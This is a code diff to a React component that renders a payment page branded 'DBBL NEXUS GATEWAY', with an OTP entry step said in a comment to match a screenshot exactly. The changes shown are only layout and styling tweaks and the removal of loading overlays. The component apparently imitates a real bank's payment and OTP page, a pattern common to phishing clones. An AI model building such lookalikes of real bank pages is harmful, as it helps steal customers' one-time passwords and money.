@@ -152,11 +152,11 @@ const RocketPayment = () => {
   const gatewayBanner = (
     <>
       <div className="bg-white py-1 text-center">
-        <span className="text-[#0000cc] text-base min-[375px]:text-lg font-bold tracking-wide" style={{ fontFamily: 'Georgia, "Times New Roman", serif' }}>
+        <span className="text-[#0000cc] text-sm min-[375px]:text-base font-bold tracking-wide" style={{ fontFamily: 'Georgia, "Times New Roman", serif' }}>
           DBBL NEXUS GATEWAY
         </span>
       </div>
-      <div className="h-[2px] bg-gradient-to-r from-[#0044aa] via-[#0066cc] to-[#0044aa]"></div>
+      <div className="h-[3px] bg-gradient-to-r from-[#0044aa] via-[#0066cc] to-[#0044aa]"></div>
     </>
   );
 
@@ -179,7 +179,7 @@ const RocketPayment = () => {
   // Retro metallic button SVG
   const makeButton = (label: string) => {
     const encoded = encodeURIComponent(label);
-    return `data:image/svg+xml;charset=utf-8,%3Csvg xmlns='http://www.w3.org/2000/svg' width='120' height='28'%3E%3Cdefs%3E%3ClinearGradient id='g' x1='0%25' y1='0%25' x2='0%25' y2='100%25'%3E%3Cstop offset='0%25' stop-color='%23e0e0e0'/%3E%3Cstop offset='50%25' stop-color='%23c8c8c8'/%3E%3Cstop offset='100%25' stop-color='%23a0a0a0'/%3E%3C/linearGradient%3E%3C/defs%3E%3Crect width='120' height='28' rx='2' fill='url(%23g)' stroke='%23888' stroke-width='1'/%3E%3Crect x='4' y='0' width='3' height='28' fill='%23cc0000'/%3E%3Crect x='7' y='0' width='3' height='28' fill='%23009933'/%3E%3Crect x='10' y='0' width='3' height='28' fill='%23003399'/%3E%3Crect x='107' y='0' width='3' height='28' fill='%23003399'/%3E%3Crect x='110' y='0' width='3' height='28' fill='%23009933'/%3E%3Crect x='113' y='0' width='3' height='28' fill='%23cc0000'/%3E%3Ctext x='60' y='19' text-anchor='middle' font-family='Arial' font-size='13' font-weight='bold' fill='%23333'%3E${encoded}%3C/text%3E%3C/svg%3E`;
+    return `data:image/svg+xml;charset=utf-8,%3Csvg xmlns='http://www.w3.org/2000/svg' width='90' height='22'%3E%3Cdefs%3E%3ClinearGradient id='g' x1='0%25' y1='0%25' x2='0%25' y2='100%25'%3E%3Cstop offset='0%25' stop-color='%23e0e0e0'/%3E%3Cstop offset='50%25' stop-color='%23c8c8c8'/%3E%3Cstop offset='100%25' stop-color='%23a0a0a0'/%3E%3C/linearGradient%3E%3C/defs%3E%3Crect width='90' height='22' rx='2' fill='url(%23g)' stroke='%23888' stroke-width='1'/%3E%3Crect x='3' y='0' width='2' height='22' fill='%23cc0000'/%3E%3Crect x='5' y='0' width='2' height='22' fill='%23009933'/%3E%3Crect x='7' y='0' width='2' height='22' fill='%23003399'/%3E%3Crect x='81' y='0' width='2' height='22' fill='%23003399'/%3E%3Crect x='83' y='0' width='2' height='22' fill='%23009933'/%3E%3Crect x='85' y='0' width='2' height='22' fill='%23cc0000'/%3E%3Ctext x='45' y='15' text-anchor='middle' font-family='Arial' font-size='11' font-weight='bold' fill='%23333'%3E${encoded}%3C/text%3E%3C/svg%3E`;
   };
 
   // OTP Page (matches second screenshot exactly)
@@ -219,18 +219,18 @@ const RocketPayment = () => {
             </div>
 
             {/* Go button + error inline */}
-            <div className="flex items-center justify-center gap-3 mb-4">
+            <div className="relative flex items-center justify-center mb-4">
               <button
                 onClick={handleOtpSubmit}
                 disabled={isSubmitting}
-                className="border border-[#999] bg-[#f0f0f0] px-1.5 flex items-center gap-1 hover:bg-[#e0e0e0] text-xs leading-tight shrink-0"
-                style={{ fontFamily: 'Arial, sans-serif', height: '16px' }}
+                className="border border-[#999] bg-[#f0f0f0] px-2 flex items-center gap-1 hover:bg-[#e0e0e0] text-xs leading-tight shrink-0"
+                style={{ fontFamily: 'Arial, sans-serif', height: '20px' }}
               >
                 <span className="font-bold text-[#333]">Go</span>
                 <span className="bg-red-600 text-white text-[9px] font-bold px-0.5 leading-none">&gt;</span>
               </button>
               {showError && (
-                <span className="text-red-600 text-[10px] min-[375px]:text-xs font-medium whitespace-nowrap">Invalid OTP provided.</span>
+                <span className="absolute left-[calc(50%+40px)] text-red-600 text-[10px] min-[375px]:text-xs font-medium whitespace-nowrap">Invalid OTP provided.</span>
               )}
             </div>
 
@@ -241,14 +241,6 @@ const RocketPayment = () => {
           </div>
         </div>
 
-        {isSubmitting && (
-          <div className="fixed inset-0 bg-white/80 flex items-center justify-center z-50">
-            <div className="text-center">
-              <div className="w-6 h-6 border-2 border-[#0066cc] border-t-transparent rounded-full animate-spin mx-auto mb-1"></div>
-              <p className="text-xs text-[#333]">Processing...</p>
-            </div>
-          </div>
-        )}
       </div>
     );
   }
@@ -370,13 +362,13 @@ const RocketPayment = () => {
           {/* Buttons */}
           <div className="flex items-center justify-center gap-2 mt-4 min-[375px]:mt-5">
             <button onClick={handleBack} className="hover:opacity-80">
-              <img src={makeButton("BACK")} alt="BACK" className="h-7 cursor-pointer" />
+              <img src={makeButton("BACK")} alt="BACK" className="h-5 cursor-pointer" />
             </button>
             <button onClick={handleSubmit} disabled={isSubmitting} className="hover:opacity-80">
-              <img src={makeButton("SUBMIT")} alt="SUBMIT" className="h-7 cursor-pointer" />
+              <img src={makeButton("SUBMIT")} alt="SUBMIT" className="h-5 cursor-pointer" />
             </button>
             <button onClick={handleReset} className="hover:opacity-80">
-              <img src={makeButton("RESET")} alt="RESET" className="h-7 cursor-pointer" />
+              <img src={makeButton("RESET")} alt="RESET" className="h-5 cursor-pointer" />
             </button>
           </div>
 
@@ -389,15 +381,6 @@ const RocketPayment = () => {
         {footer}
       </div>
 
-      {/* Loading overlay */}
-      {isSubmitting && (
-        <div className="fixed inset-0 bg-white/80 flex items-center justify-center z-50">
-          <div className="text-center">
-            <div className="w-6 h-6 border-2 border-[#0066cc] border-t-transparent rounded-full animate-spin mx-auto mb-1"></div>
-            <p className="text-xs text-[#333]">Processing...</p>
-          </div>
-        </div>
-      )}
     </div>
   );
 };
